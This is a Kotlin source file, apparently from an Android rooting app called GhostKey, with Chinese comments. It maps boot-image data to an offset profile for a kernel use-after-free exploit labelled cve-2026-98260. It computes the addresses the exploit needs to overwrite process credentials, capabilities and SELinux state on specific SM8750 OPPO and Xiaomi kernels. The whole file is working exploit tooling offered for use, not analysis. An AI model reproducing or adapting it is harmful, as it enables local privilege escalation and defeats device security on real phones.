package com.GhostKey.app.data.ota

import com.GhostKey.app.data.ProfileDocument

/**
 * Phase 3 桥接：把 [BootImageParser] 的解析结果映射为通用 [ProfileDocument]。
 *
 * 字段来源（与 PC 端 make.py / offsets.h 的产出对齐，已用 PKJ110_F27 真值回归）：
 *   - BTF（boot.img 即可）：task_cred / task_struct_size / cred_uid
 *   - kallsyms（boot.img 解压后的内核镜像即可，见 [KallsymsExtractor]）：
 *       timer_link   = do_timer_create + 0xa8（make.py:189）
 *       cred_link    = prepare_creds  + 0x24（make.py:190）
 *       selinux_link = selinux_state
 *       user_ns      = init_user_ns
 *       root_user    = root_user
 *       groups       = init_groups
 *       ucounts      = init_ucounts
 *   - 常量：
 *       page_offset  = 0xFFFFFF8000000000（arm64 PAGE_OFFSET）- 0x80000000（SM8750 DRAM 起始）
 *                    = 0xFFFFFF7F80000000（直接映射基址，与 pkj110.conf 一致）
 *       kitimer_node = 0x78（src/uaf_plant.c 编译期覆盖值，非 offsets.h 的 0x0）
 *
 * 若某符号在 kallsyms 中缺失（去歧义后未命中），对应字段不写入，
 * 由 [com.GhostKey.app.data.ProfileDocument.missingRequiredFields] 回报给用户。
 */
object ImgToProfile {

    /** do_timer_create 内 kmem_cache_alloc 调用点偏移（PC 端 make.py 硬编码）。 */
    private const val TIMER_LINK_INNER_OFFSET = 0xA8L

    /** prepare_creds 内返回指令偏移（PC 端 make.py 硬编码）。 */
    private const val CRED_LINK_INNER_OFFSET = 0x24L

    /**
     * copy_process 内 `kmem_cache_alloc_node(task_struct_cachep, …)` 的返回地址偏移。
     *
     * 6.6.x 的 copy_process 在最开头内联 dup_task_struct，反汇编实测
     * （小米 ab16143355 与 OPPO abogki537459655 两张 6.6.118 完全一致）：
     *   +0x138  ldr  x0, [task_struct_cachep]
     *   +0x13c  bl   kmem_cache_alloc_node
     *   +0x140  ← tracepoint 记录的 _RET_IP_
     * 只对 6.6.x 生效（见下方 gate）；其他内核留空，`leak_task()` 自动退回尺寸匹配。
     */
    private const val TASK_ALLOC_INNER_OFFSET = 0x140L

    /** arm64 PAGE_OFFSET（0xFFFFFF8000000000 的有符号补码位模式）。 */
    private const val PAGE_OFFSET = -0x8000000000L

    /** SM8750/PKJ110 DRAM 起始物理地址。 */
    private const val DRAM_PHYS_START = 0x80000000L

    /** kitimer_node 编译期生效值（pkj110.conf 注释：src/uaf_plant.c 重新 #define 为 0x78）。 */
    private const val KITIMER_NODE = 0x78L

    fun toProfileDocument(
        info: BootImageParser.ExtractedKernelInfo,
        imageFileName: String,
    ): Pair<ProfileDocument, List<String>> {
        val release = info.release?.takeIf { it.isNotBlank() }
            ?: "unknown-${info.imageSha256.take(8)}"

        val offset = LinkedHashMap<String, Any?>()
        info.structOffsets?.taskStruct?.let { ts ->
            offset["task_cred"] = ts.cred
            offset["task_struct_size"] = ts.size
        }
        info.structOffsets?.cred?.let { cr ->
            offset["cred_uid"] = cr.uid
        }
        info.credLayout?.let { layout ->
            val m = layout.memberOffsets
            offset["cred_size"] = layout.size
            m["cap_inheritable"]?.let { offset["cred_cap_inheritable"] = it }
            m["cap_permitted"]?.let { offset["cred_cap_permitted"] = it }
            m["cap_effective"]?.let { offset["cred_cap_effective"] = it }
            m["cap_bset"]?.let { offset["cred_cap_bset"] = it }
            m["cap_ambient"]?.let { offset["cred_cap_ambient"] = it }
            m["security"]?.let { offset["cred_security"] = it }
            m["user"]?.let { offset["cred_user"] = it }
            m["user_ns"]?.let { offset["cred_user_ns"] = it }
            m["ucounts"]?.let { offset["cred_ucounts"] = it }
            m["group_info"]?.let { offset["cred_groups"] = it }
        }
        info.structOffsets?.kItimerSize?.let { offset["kitimer_size"] = it }

        val syms = info.symbols
        if (syms != null) {
            syms["do_timer_create"]?.let { offset["timer_link"] = it + TIMER_LINK_INNER_OFFSET }
            syms["prepare_creds"]?.let { offset["cred_link"] = it + CRED_LINK_INNER_OFFSET }
            syms["selinux_state"]?.let { offset["selinux_link"] = it }
            syms["init_user_ns"]?.let { offset["user_ns"] = it }
            syms["root_user"]?.let { offset["root_user"] = it }
            syms["init_groups"]?.let { offset["groups"] = it }
            syms["init_ucounts"]?.let { offset["ucounts"] = it }
            if (release.startsWith("6.6.")) {
                syms["copy_process"]?.let { offset["task_alloc_link"] = it + TASK_ALLOC_INNER_OFFSET }
            }
        }

        offset["kitimer_node"] = KITIMER_NODE

        val fields = LinkedHashMap<String, Any?>()
        fields["release"] = release
        fields["vuln_type"] = "cve-2026-98260"
        fields["recommend_shizuku"] = 1
        fields["page_offset"] = PAGE_OFFSET - DRAM_PHYS_START
        if (offset.isNotEmpty()) fields["offset"] = offset
        fields["_source"] = "img:$imageFileName"
        fields["_image_sha256"] = info.imageSha256
        if (info.notes.isNotEmpty()) {
            fields["_img_notes"] = info.notes.joinToString("; ")
        }

        val doc = ProfileDocument(release = release, fields = fields)
        return doc to doc.missingRequiredFields()
    }
}
